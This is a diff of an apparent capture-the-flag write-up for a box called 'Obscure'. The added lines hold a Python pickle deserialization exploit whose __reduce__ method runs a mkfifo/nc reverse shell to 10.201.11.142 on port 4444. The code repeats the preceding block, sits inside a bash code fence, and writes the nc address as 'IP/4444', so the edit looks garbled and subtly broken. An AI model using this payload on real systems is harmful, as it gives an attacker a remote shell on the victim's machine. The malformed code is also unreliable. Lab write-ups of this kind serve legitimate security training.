@@ -295,13 +295,18 @@ with open("exploit.pickle", "wb") as f:
   cPickle.dump(Exploit(), f, cPickle.HIGHEST_PROTOCOL)
 ```
 
-<br>
+
 
 ```bash
-:~/Obscure# nano exploit.py
-:~/Obscure# python2.7 exploit.py
-:~/Obscure# ls
-44064.md  exploit.pickle  exploit.py
+import cPickle
+import os
+
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, (("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.201.11.142/4444 >/tmp/f"),))
+
+with open("exploit.pickle", "wb") as f:
+    cPickle.dump(Exploit(), f, cPickle.HIGHEST_PROTOCOL)
 ```
 
 <br>
